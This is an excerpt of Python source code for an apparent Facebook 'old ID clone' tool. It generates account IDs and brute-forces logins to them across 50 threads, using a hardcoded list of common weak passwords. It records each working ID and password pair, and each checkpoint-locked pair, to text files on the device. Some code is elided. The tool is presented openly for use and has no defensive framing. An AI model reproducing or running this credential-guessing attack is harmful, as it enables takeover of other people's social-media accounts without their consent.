...
class OLD_CLONER:
    ...
    def banner(self):
        os.system("clear")
        print("DEVELOPER  :  ARIYAN RIFAT")
        print("GITHUB     : ROLEX-999")
        print("FEATURE    : OLD ID CLONE")
        print("VERSION    : 0.1 FREEEEE")
        print("-------------------------------")
    ...
    def oldClone(self,series):
        ...
        with ThreadPoolExecutor(max_workers=50) as Mr_Code:
            ...
            for love in self.gen:
                ids = self.uX + love
                passlist = ["123456", "1234567", "12345678", "123456789", "123123", "112233", "1234567890", "password", "@@@###", "098765", "009988", "1@2#3৳", "0987654", "098765432", "0987654321", "11223344", "00998877"]
    ...
    def CloneOld(self,ids,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r\x1b[mAR1Y4N-XD {self.loop}|OLD|OK:{len(self.oks)}|CP:{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                data = {
                ...
                if "access_token" in response:
                    ...
                    open("/sdcard/AR1Y4N-OLD-OK.txt","a").write(ids+"|"+pas+"\n")
                    self.oks.append(ids)
                    break
                elif "www.facebook.com" in response["error"]["message"]:
                    print(f"\r\r\x1b[38;5;196mOLD-CP • {ids} • {pas}")
                    open("/sdcard/AR1Y4N-OLD-CP.txt","a").write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop += 1
